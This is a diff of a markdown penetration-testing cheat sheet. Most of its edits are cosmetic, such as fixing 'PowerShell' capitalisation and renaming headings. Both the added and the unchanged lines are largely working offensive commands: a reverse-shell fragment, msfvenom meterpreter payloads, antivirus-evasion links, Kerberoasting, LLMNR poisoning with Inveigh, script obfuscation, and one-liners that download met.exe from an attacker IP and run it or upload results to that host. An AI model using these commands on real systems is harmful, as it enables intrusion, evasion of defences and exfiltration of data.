@@ -4,7 +4,7 @@
 [//]: # (## -- 4 spaces before)
 [//]: # (### -- 3 spaces before)
 [//]: # (#### -- 2 spaces before)
-[//]: # (##### -- 1 spaces before)
+[//]: # (##### -- 1 space before)
 
 * TOC
 {:toc}
@@ -59,7 +59,7 @@ root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,sock
 
 
 
-### Powershell
+### PowerShell
 
 Invoke-Expression (UTF-16LE):
 
@@ -88,7 +88,7 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.14.234",1337);$stream =
 
 ### Meterpreter
 
-Powershell + msfvenom:
+PowerShell + msfvenom:
 
 ```
 root@kali:$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=127.0.0.1 LPORT=1337 -f exe > met.exe
@@ -97,7 +97,7 @@ PS > (New-Object Net.WebClient).DownloadFile("met.exe", "$env:TEMP\met.exe")
 PS > Start-Process "$env:TEMP\met.exe"
 ```
 
-Powershell + unicorn **[1]**:
+PowerShell + unicorn **[1]**:
 
 ```
 root@kali:$ ./unicorn.py windows/meterpreter/reverse_https LHOST 443
@@ -769,8 +769,7 @@ PS > Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_N
 Get DC names:
 
 ```
-PS > $env:userdnsdomain
-PS > nslookup -type=all _ldap._tcp.dc._msdcs.megacorp.local
+PS > nslookup -type=all _ldap._tcp.dc._msdcs.$env:userdnsdomain
 
 PS > $ldapFilter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
 PS > $searcher = [ADSISearcher]$ldapFilter
@@ -1051,7 +1050,9 @@ PS > cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 
 * [hacker.house/lab/windows-defender-bypassing-for-meterpreter/](https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/)
 * [codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/](https://codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/)
-
+* [hausec.com/2019/02/09/suck-it-windows-defender/]https://hausec.com/2019/02/09/suck-it-windows-defender/)
+* [medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad](https://medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad)
+* [medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8](https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8)
 
 
 ### msfvenom
@@ -1984,10 +1985,10 @@ user@vict:$ ./pspy
 
 #### Recon
 
-Powershell history:
+PowerShell history:
 
 ```
-PS > Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+PS > Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
 ##### Tools
@@ -2091,7 +2092,7 @@ PS > Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlog
 
 
 
-## PrivEsc
+## LPE
 
 * [PayloadsAllTheThings/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
@@ -2149,7 +2150,17 @@ PAM MOTD:
 ### Windows
 
 
-#### Powershell
+#### Windows-Exploit-Suggester
+
+* [github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+
+```
+$ sudo python -m pip install xlrd
+$ python -u windows-exploit-suggester.py -d 2020-09-02-mssb.xls -i systeminfo.txt --ostext 'windows 10 64-bit' --hotfixes hotfixes.txt | tee wes.log
+```
+
+
+#### PowerShell
 
 Run as another user:
 
@@ -2752,14 +2763,12 @@ $ sudo apt install openjdk-11-jdk
 
 
 
-# Methodologies
-
+# Technics
 
 
 
 
 ## OSINT
-
 
 
 
@@ -2836,8 +2845,8 @@ PS > netstat -ano | findstr LIST
 PS > ipconfig /all
 PS > route print
 PS > dir -force c:\
-PS > [Environment]::Is64BitOperatingSystem
 PS > (wmic os get OSArchitecture)[2]
+PS > [Environment]::Is64BitOperatingSystem
 PS > $ExecutionContext.SessionState.LanguageMode
 
 PS > cmd /c dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
@@ -2851,27 +2860,84 @@ PS > .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
 PS > powershell.exe -nop -exec bypass -c "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks |Out-File PowerUp.txt}"
 PS > powershell.exe -nop -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File Sherlock.txt}"
 
-PowerView3 > Get-DomainComputer -Properties Name | Resolve-IPAddress
-
 PS > powershell -NoP -sta -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.ps1');Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup,LoggedOn"
+
+PS > gc .\100-hosts.txt | % {gwmi -Query "select * from Win32_Process" -ComputerName $_ | ? {$_.Caption -in "avp.exe","MsMpEng.exe","cpda.exe"} | select ProcessName,PSComputerName}
+```
+
+`PowerView.ps1`:
+
+* [www.harmj0y.net/blog/powershell/make-powerview-great-again/](https://www.harmj0y.net/blog/powershell/make-powerview-great-again/)
+* [github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
+* [gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+* [PowerView 2.0](https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerView/powerview.ps1)
+* [PowerView 3.0 [dev]](https://github.com/PowerShellMafia/PowerSploit/raw/dev/Recon/PowerView.ps1)
+
+```
+PowerView3 > Get-DomainComputer -Properties Name | Resolve-IPAddress
+PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
+```
+
+`PowerUp.ps1`:
+
+* [github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+* [github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
+* [recipeforroot.com/advanced-powerup-ps1-usage/](https://recipeforroot.com/advanced-powerup-ps1-usage/)
+
+```
+PS > Invoke-PrivescAudit
+```
+
+`Invoke-Portscan.ps1`:
+
+* [github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1)
+* [powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/)
+
+```
+PS > Invoke-Portscan -Hosts 127.0.0.1/24 -T 4 -TopPorts 25 -oA localnet
+```
+
+`Inveigh.ps1`:
+
+* [github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
+
+```
+PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y –NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
+```
+
+`Invoke-Obfuscation.ps1`:
+
+* [github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
+* [www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide)
+
+`Out-EncryptedScript.ps1`:
+
+* [github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1)
+* [powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/](https://powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/)
+
+```
+PS > Out-EncryptedScript .\script.ps1 $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) s4lt -FilePath .\evil.ps1
+PS > [string] $cmd = gc .\evil
+PS > $dec = de "Passw0rd!" s4lt
+PS > Invoke-Expression $dec
 ```
 
 
 #### One-liners
 
-Powershell ping sweep:
+PowerShell ping sweep:
 
 ```
 echo "[*] Scanning in progress...";1..254 |ForEach-Object {Get-WmiObject Win32_PingStatus -Filter "Address='10.10.100.$_' and Timeout=50 and ResolveAddressNames='false' and StatusCode=0" |select ProtocolAddress* |Out-File -Append -FilePath .\live_hosts.txt};echo "[+] Live hosts:"; Get-Content -Path .\live_hosts.txt | ? { $_ -match "10.10.100" }; echo "[*] Done.";del .\live_hosts.txt
 ```
 
-Powershell auto detect proxy, download file from remote HTTP server and run it:
+PowerShell auto detect proxy, download file from remote HTTP server and run it:
 
 ```
 $proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").ProxyServer;$proxy=New-Object System.Net.WebProxy;$proxy.Address=$proxyAddr;$proxy.useDefaultCredentials=$true;$client=New-Object System.Net.WebClient;$client.Proxy=$proxy;$client.DownloadFile("http://10.10.13.37/met.exe","$env:userprofile\music\met.exe");$exec=New-Object -com shell.application;$exec.shellexecute("$env:userprofile\music\met.exe")
 ```
 
-Powershell manually set proxy and upload file to remote HTTP server:
+PowerShell manually set proxy and upload file to remote HTTP server:
 
 ```
 $client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.megacorp.local:3128",$true);$creds=New-Object Net.NetworkCredential('snovvcrash','Passw0rd!','megacorp.local');$creds=$creds.GetCredential("http://proxy.megacorp.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
